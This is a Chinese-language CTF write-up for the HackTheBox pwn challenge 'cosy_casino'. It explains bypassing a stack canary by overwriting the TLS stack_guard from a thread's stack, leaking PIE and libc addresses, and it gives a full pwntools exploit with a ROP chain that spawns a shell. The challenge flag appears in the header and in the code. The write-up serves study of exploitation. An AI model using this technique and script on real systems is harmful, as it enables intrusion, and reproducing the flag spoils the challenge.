---
title: HTB-cosy_casino-pwn-challenge-wp
categories: [CTF,HTB]
tags: [pwn]
password: HTB{thr34d5_4nd_c4n4r13s_4r3_n0t_g00d_fr13nd5_4ft3r_4ll}
---
学习到了`thread stack bypass canary`还是比较有意思的一题<!--more-->

## 题目保护

参看题目保护，发现保护全开。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 劫持程序流

分析程序流程，在 last_chance发现一个栈溢出点。

```c
unsigned __int64 __fastcall last_chance(void *a1)
{
  char buf; // [rsp+0h] [rbp-30h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts(aYouHaveOnlyAFe);
  read(0, &buf, 0x900uLL);
  gems += 20;
  return __readfsqword(0x28u) ^ v3;
}
```

但是由于题目有canary保护，我们需要劫持canary或泄露出canary。但审计代码发现`last_chance`的调用非常诡异：

```c
  pthread_create(&newthread, 0LL, (void *(*)(void *))last_chance, 0LL);
  pthread_join(newthread, 0LL);
```

在查阅资料时发现：

> 研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。
> 在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。
> 从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。
> 从TLS到pthread_create的函数参数传递栈帧的距离小于一页。
> 现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。

具体可以参看：

https://www.openwall.com/lists/oss-security/2018/02/27/5

https://eternalsakura13.com/2018/04/24/starctf_babystack/

加之，题目中read 溢出空间大，我们就有机会把canary 劫持成我们自己输入的数据，从而劫持RBP与RIP即劫持了程序流。



## 泄露地址

现在我们解决了程序流问题，下面的问题就是如何获取gadget和libc基础地址来调用后门的问题。经过调试发现，如果在`get_ul`函数中的`__isoc99_scanf("%lu", a1);`输入`\x00`字符，那么将不会改变a1里原本的数据。

```shell
 ► 0x55d257047727 <main+456>    call   get_ul <get_ul>
        rdi: 0x7ffd1bd61888 —▸ 0x55d257046b20 (_start) ◂— xor    ebp, ebp
        rsi: 0x0
        rdx: 0x0
        rcx: 0x7ff2c5b8cdd4 (write+20) ◂— cmp    rax, -0x1000 /* 'H=' */
        
————————————————————————————————————————————————————————————————————
 ► 0x55d2570472fd <get_ul+46>    call   __isoc99_scanf@plt <__isoc99_scanf@plt>
        format: 0x55d257047dea ◂— 0x7325000000756c25 /* '%lu' */
        vararg: 0x7ffd1bd61888 —▸ 0x55d257046b20 (_start) ◂— xor    ebp, ebp
gdb-peda$ x/36gx 0x7ffd1bd61888
0x7ffd1bd61888: 0x000055d257046b20      0x00007ffd1bd61980

```

在题目环境中我们就泄露处出`__start`的地址，解决获得了elf的基本地址。

从而推算出elf文件中的`pop rdi;ret`指令的地址和`puts`函数在got表中地址的。从而泄露出libc的基地址。

## exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/11/18 11:22:47
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./casino'
e=ELF(elf)
context.log_level = 'debug'
context.arch=e.arch
ip_port=['46.101.51.163',30846]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])


p.sendline('1')


p.sendline('1')
p.sendline('%p')
for i in range(10):
    p.sendline('1')
    p.recvuntil('Pick a number (0-32)')
    p.sendline('\x00')
    p.recv()
debug()
p.sendline('3')

p.recvuntil('Pick a number (0-32)')

p.sendline('\x00')

p.recvuntil('[-]')

addr=int(p.recvuntil('is')[:-2])
log.info(hex(addr))
e_base=addr-0xb20
#0x00000000000018f3 : pop rdi ; ret
#0x000000000000226b : call qword ptr [rbp + 1]
#0x0000000000000b80 : pop rbp ; ret
#0x00000000000009e6 : ret
ret=e_base+0x00000000000009e6 
call_rbp=e_base+0x000000000000226b
rdi_ret=e_base+0x00000000000018f3
rbp_ret=e_base+0x0000000000000b80
e_put=e_base+e.plt['puts']
e_got_put=e_base+e.got['puts']
log.info('puts:'+hex(e_put)+'-'+hex(e_got_put))

e_got_read=e_base+e.got['read']
e_alarm=e_base+e.plt['alarm']
#p.sendline('\x01'*0x840)
base_addr=0x204700+e_base
#0x00000000000009e6 : ret
#0x000000000000EF2  ; void *last_chance(void *)
"""
pay='\x7f'*0x38+p64(rdi_ret)+p64(e_got_put)+p64(e_put)+p64(rdi_ret)+p64(0x200)+p64(e_alarm)+csu(e_got_read,0,base_addr-1,0x10,rdi_ret)+p64(base_addr+8)
pay+=csu(e_got_read,0,base_addr,0x18,rdi_ret)+p64(base_addr+0x10)+csu(e_got_read,0,0,0,rdi_ret)+p64(base_addr+0x10)+p64(rbp_ret)+p64(base_addr-1)+p64(0x00000000000009e6+e_base)+p64(call_rbp)+'x'*8
pay+=(0x900-len(pay))*'\x7f'
"""
pay='\x7f'*0x38+p64(rdi_ret)+p64(e_got_put)+p64(e_put)+p64(e_base+0x000000000000EF2)*2
pay+=(0x8ff-len(pay))*'\x7f'
#debug()
p.sendline(pay)

puts_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
x=finder('puts',puts_base)

pay='\x00'*0x38+p64(x.ogg())+p64(e_base+0x000000000000EF2 )
pay+=(0x8ff-len(pay))*'\x00'
p.sendline(pay)
p.interactive()


#HTB{thr34d5_4nd_c4n4r13s_4r3_n0t_g00d_fr13nd5_4ft3r_4ll}
```

